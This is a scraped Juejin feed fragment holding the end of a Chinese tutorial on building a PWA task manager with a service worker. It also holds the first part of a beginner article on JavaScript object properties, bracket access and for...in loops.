                                    <span class="hljs-subst">${task.completed ? <span class="hljs-string">'取消完成'</span> : <span class="hljs-string">'完成'</span>}</span>
                                &lt;/button&gt;
                                &lt;button class="delete-btn" data-id="<span class="hljs-subst">${task.id}</span>"&gt;删除&lt;/button&gt;
                            &lt;/div&gt;
                        &lt;/li&gt;
                    `</span>).join(<span class="hljs-string">''</span>)}</span>
                &lt;/ul&gt;
            &lt;/div&gt;
        `</span>;
    }

    <span class="hljs-title function_">renderProfile</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`
            &lt;div class="profile-page"&gt;
                &lt;div class="user-card"&gt;
                    &lt;h3&gt;用户信息&lt;/h3&gt;
                    &lt;p&gt;这是一个简单的Web App示例&lt;/p&gt;
                &lt;/div&gt;
                &lt;div class="app-info"&gt;
                    &lt;h4&gt;关于应用&lt;/h4&gt;
                    &lt;p&gt;版本: 1.0.0&lt;/p&gt;
                    &lt;button id="clearData" class="btn-secondary"&gt;清除所有数据&lt;/button&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        `</span>;
    }

    <span class="hljs-title function_">addTask</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'taskInput'</span>);
        <span class="hljs-keyword">const</span> text = input?.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
        
        <span class="hljs-keyword">if</span> (text) {
            <span class="hljs-keyword">const</span> newTask = {
                <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(),
                <span class="hljs-attr">text</span>: text,
                <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-attr">createdAt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
            };
            
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">push</span>(newTask);
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveTasks</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
            
            <span class="hljs-keyword">if</span> (input) input.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
        }
    }

    <span class="hljs-title function_">toggleTask</span>(<span class="hljs-params">taskId</span>) {
        <span class="hljs-keyword">const</span> task = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> === taskId);
        <span class="hljs-keyword">if</span> (task) {
            task.<span class="hljs-property">completed</span> = !task.<span class="hljs-property">completed</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveTasks</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
        }
    }

    <span class="hljs-title function_">deleteTask</span>(<span class="hljs-params">taskId</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> !== taskId);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveTasks</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
    }

    <span class="hljs-title function_">saveTasks</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'tasks'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>));
    }
}

<span class="hljs-comment">// 初始化应用</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">TaskManager</span>();
});
</code></pre>
<h3 data-id="heading-5">4. PWA配置文件</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// manifest.json</span>
<span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"我的任务管理器"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"short_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"任务管理"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"一个简单的任务管理Web App"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"start_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"display"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"standalone"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"background_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#ffffff"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"theme_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#2196F3"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"orientation"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"portrait"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"icons"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"icon-192.png"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"192x192"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"icon-512.png"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"512x512"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// sw.js - 服务Worker</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">'task-manager-v1'</span>;
<span class="hljs-keyword">const</span> urlsToCache = [
    <span class="hljs-string">'/'</span>,
    <span class="hljs-string">'/index.html'</span>,
    <span class="hljs-string">'/styles.css'</span>,
    <span class="hljs-string">'/app.js'</span>,
    <span class="hljs-string">'/icon-192.png'</span>,
    <span class="hljs-string">'/icon-512.png'</span>
];

<span class="hljs-comment">// 安装Service Worker</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'install'</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> {
    event.<span class="hljs-title function_">waitUntil</span>(
        caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>)
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(urlsToCache))
    );
});

<span class="hljs-comment">// 拦截请求</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'fetch'</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> {
    event.<span class="hljs-title function_">respondWith</span>(
        caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
                <span class="hljs-comment">// 返回缓存或网络请求</span>
                <span class="hljs-keyword">return</span> response || <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>);
            }
        )
    );
});
</code></pre>
<h2 data-id="heading-6">总结</h2>
<h3 data-id="heading-7">🎯 核心概念</h3>
<ul>
<li><strong>Web App</strong> = HTML5 + CSS3 + JavaScript</li>
<li><strong>PWA</strong> = Web App + 原生应用体验</li>
<li><strong>SPA</strong>：单页面应用，动态更新内容</li>
</ul>
<h3 data-id="heading-8">🛠️ 技术要点</h3>
<ul>
<li><strong>HTML5</strong>：语义化标签、离线存储、Service Worker</li>
<li><strong>CSS3</strong>：Flexbox/Grid布局、响应式设计、CSS变量</li>
<li><strong>JavaScript</strong>：ES6+语法、模块化、异步编程、类组件</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《深入理解 JavaScript 对象：属性命名、访问与遍历的那些细节》]]></title>    <link>https://juejin.cn/post/7574680270538194944</link>    <guid>https://juejin.cn/post/7574680270538194944</guid>    <pubDate>2025-11-21T05:08:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574680270538194944" data-draft-id="7574728397373931572" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《深入理解 JavaScript 对象：属性命名、访问与遍历的那些细节》"/> <meta itemprop="keywords" content="JavaScript,前端"/> <meta itemprop="datePublished" content="2025-11-21T05:08:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xhxxx"/> <meta itemprop="url" content="https://juejin.cn/user/3235201610941578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《深入理解 JavaScript 对象：属性命名、访问与遍历的那些细节》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3235201610941578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xhxxx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:08:59.000Z" title="Fri Nov 21 2025 05:08:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    23
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 中的对象：从基础到进阶</h2>
<blockquote>
<p>在 JavaScript 中，对象是数据组织的核心方式之一。无论是存储配置信息、封装函数行为，还是构建复杂的类与实例，对象都扮演着不可或缺的角色。本文将带你深入理解 JavaScript 对象的方方面面，包括属性定义、访问方式、命名规则以及遍历技巧。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">对象的创建方式</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-keyword">let</span> user ={};<span class="hljs-comment">//字面量创建</span>
</code></pre>
<p>通过我们使用花括号来，也就是字面量</p>
<h3 data-id="heading-2">1. 文本和属性</h3>
<p>在 JavaScript 中，对象是由一组 <strong>键值对</strong>（key-value ）组成的集合。每个键被称为“属性名”，对应的值称为“属性值”。<br/>
考虑下面这段代码来进行一个全方位演示</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">"alice@example.com"</span>,
 <span class="hljs-comment">//多词属性</span>
  <span class="hljs-string">"like dogs"</span>:<span class="hljs-literal">true</span>,
};
</code></pre>
<ul>
<li><code>name</code>、<code>age</code>、<code>email</code> 、<code>"like dogs"</code>是属性名</li>
<li><code>"Alice"</code>、<code>25</code>、<code>"alice@example.com"</code> 是属性值</li>
</ul>
<blockquote>
<ul>
<li>当我们使用多字词语来命名属性时，必须加上引号，如代码中的<code>like dogs</code></li>
<li>列表中的最后一个属性应以逗号结尾----这叫做尾随（trailing）或悬挂（hanging）逗号。这样便于我们添加、删除和移动属性，因为所有的行都是相似的。</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-3">2. 方括号语法：动态访问属性</h3>
<p>考虑这样一段代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">"alice@example.com"</span>,
 <span class="hljs-comment">//多词属性</span>
  <span class="hljs-string">"like dogs"</span>:<span class="hljs-literal">true</span>,
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>) <span class="hljs-comment">// Alice</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">age</span>) <span class="hljs-comment">//25</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">like</span> dogs) <span class="hljs-comment">// 会是true吗？</span>

</code></pre>
<p>我们通常都可以通过<code>.</code>符号来访问我们的对象属性，但是考虑上面这段代码，当我们访问name和age时，确实能够访问到<code>name</code> 和<code>age</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93f6693e54834080bfc930298c8c93d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=gwsh8zBvwMlpbvVO8I3crbw%2FyjU%3D" alt="image.png" loading="lazy"/><br/>
但是当我们去使用点符号访问<code>like dogs</code>属性时，就会给出语法错误</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cb72bca032240e49ecb7f3f0b40df11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=98XleTkzGHS2WmxnH4s4zlDt%2BnE%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-4"><strong>背后的原因</strong>：</h5>
<ul>
<li>
<p>由于这是一个多词属性，JavaScript 理解不了。它认为我们在处理 <code>user.likes</code>，然后在遇到意外的 <code>birds</code> 时给出了语法错误。</p>
</li>
<li>
<p>点符号要求 <code>key</code> 是有效的变量标识符。这意味着：不包含空格，不以数字开头，也不包含特殊字符（允许使用 <code>$</code> 和 <code>_</code>）。</p>
</li>
</ul>
<h5 data-id="heading-5"><strong>处理方法</strong>：</h5>
<ul>
<li>通过<strong>方括号</strong>进行访问</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f347760305342efa5e9d3dc2939c7f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=Ua2S1BMoVNh1g7VkkU5nxHxkrqk%3D" alt="image.png" loading="lazy"/><br/>
通过方括号我们可以对多词属性实现和<code>.</code>操作一样的效果，但要<strong>注意</strong>：方括号并不是只用于多词属性，普通属性也可以实现一样的效果，只是因为<code>.</code>操作在我们访问普通属性时更方便</p>
<h4 data-id="heading-6">方括号-计算属性</h4>
<p>当创建一个对象时，我们可以在对象字面量中使用方括号。这叫做 <strong>计算属性</strong>。<br/>
例如这样一段代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> fruit = apple<span class="hljs-comment">//这里做一个简单的模拟用户输入</span>

<span class="hljs-keyword">let</span> bag = {
  [fruit]: <span class="hljs-number">5</span>, <span class="hljs-comment">// 属性名是从 fruit 变量中得到的</span>
};

<span class="hljs-title function_">alert</span>( bag.<span class="hljs-property">apple</span> ); <span class="hljs-comment">// 5 </span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b44d8b3bddd49a28b505a0665450b20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=o6EIUQ5gILlqwXq%2Fk2AUrbhE5fo%3D" alt="image.png" loading="lazy"/><br/>
<strong>计算属性的含义很简单：<code>[fruit]</code> 含义是属性名应该从 <code>fruit</code> 变量中获取。</strong></p>
<p>我们可以在方括号中使用更复杂的表达式。<br/>
例如这样一段代码：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d65c2a5043824353bd73dfd3829adb96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=ArTWNssZkAMAQ6yPSxGST1AvJFU%3D" alt="image.png" loading="lazy"/>
通过方括号我们可以实现很多复杂操作，在这里就不一一讲解</p>
<h3 data-id="heading-7">3. 属性值简写（ES6 新特性）</h3>
<p>ES6 引入了简洁的属性值写法，当你需要将变量名直接作为属性名并赋值自身时，可以直接省略冒号和重复的变量名。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> name = <span class="hljs-string">"Bob"</span>;
<span class="hljs-keyword">const</span> age = <span class="hljs-number">30</span>;

<span class="hljs-keyword">const</span> person = {
  name,        <span class="hljs-comment">// 等价于 name: name</span>
  age,         <span class="hljs-comment">// 等价于 age: age</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {     <span class="hljs-comment">// 方法简写</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${name}</span>`</span>;
  }
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>); <span class="hljs-comment">// "Bob"</span>
</code></pre>
<p>这种写法让代码更简洁，特别适合构造函数或组件配置中。</p>
<hr/>
<h3 data-id="heading-8">4. 属性名称限制</h3>
<p>虽然属性名通常是字符串，但并不是所有字符串都能成为合法的属性名。</p>
<h4 data-id="heading-9">合法的属性名：</h4>
<ul>
<li>字母、数字、下划线 <code>_</code>、美元符号 <code>$</code></li>
<li>以字母、下划线或美元符号开头</li>
<li>可以包含 Unicode 字符（如中文）</li>
</ul>
<p><strong>然而，对象中属性不受这些限制</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> obj = {
  <span class="hljs-attr">for</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">let</span>: <span class="hljs-number">2</span>,
  <span class="hljs-attr">return</span>: <span class="hljs-number">3</span>
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">for</span>,obj.<span class="hljs-property">let</span>,obj.<span class="hljs-property">return</span>);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9d8b105b44748f08dcca7cea2e8b4f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=abtsjHg%2B1LqTyIX2mFN1%2B9JMdLg%3D" alt="image.png" loading="lazy"/></p>
<p><strong>“整数属性”问题：</strong></p>
<p><strong>一个字符串，如果它可以被转换为整数，再转回字符串时仍然和原来一样，那么它就是一个“整数属性”</strong> 。这类属性在 <code>for...in</code> 遍历时会按数值顺序排列。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-string">"1"</span>: <span class="hljs-string">"one"</span>,
  <span class="hljs-string">"0"</span>: <span class="hljs-string">"zero"</span>,
  <span class="hljs-string">"10"</span>: <span class="hljs-string">"ten"</span>,
  <span class="hljs-string">"2"</span>: <span class="hljs-string">"two"</span>
};

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);
}
<span class="hljs-comment">// 输出顺序：0, 1, 2, 10 → 按数值排序</span>
</code></pre>
<p>而像 <code>"1.2"</code> 或 <code>"+49"</code> 则不会被视为整数属性，仍按创建顺序排列。</p>
<hr/>
<h3 data-id="heading-10">5. 属性存在性测试：<code>in</code> 操作符</h3>
<p>相比于其他语言，JavaScript 的对象有一个需要注意的特性：能够被访问任何属性。即使属性不存在也不会报错！读取不存在的属性只会得到 <code>undefined</code>。所以我们可以很容易地判断一个属性是否存在：</p>
<p>但是要检查某个属性是否存在于对象中，我们可以使用也 <code>in</code> 操作符。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> user); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"email"</span> <span class="hljs-keyword">in</span> user); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"toString"</span> <span class="hljs-keyword">in</span> user); <span class="hljs-comment">// true（继承自 Object.prototype）</span>
</code></pre>
<p>为何会有 <code>in</code> 运算符呢？与 <code>undefined</code> 进行比较来判断还不够吗？
是的，大部分时候确实通过undefined判断完全足够，但考虑这样一个特殊情况</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> obj = {
  <span class="hljs-attr">test</span>: <span class="hljs-literal">undefined</span>
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">test</span>); <span class="hljs-comment">// 显示 undefined，所以属性不存在？</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"test"</span> <span class="hljs-keyword">in</span> obj);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc0c4707d2d7441a8ea451abdea4b214~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309604&amp;x-signature=lJB%2FpyQG1ZLSQA2WSB1JtGJoa9I%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>所以当值本身为<code>undefined</code>时，我们不能通过这种方式进行断定，虽然这种情况很少发生，但这也正是<code>in</code>为什么特殊的原因</li>
</ul>
<h3 data-id="heading-11">6. “for...in” 循环</h3>
<p><code>for...in</code> 是用来遍历对象所有可枚举属性的循环语句。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">b</span>: <span class="hljs-number">2</span>,
  <span class="hljs-attr">c</span>: <span class="hljs-number">3</span>
};

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, obj[key]);
}
<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// a 1</span>
<span class="hljs-comment">// b 2</span>
<span class="hljs-comment">// c 3</span>
</code></pre>
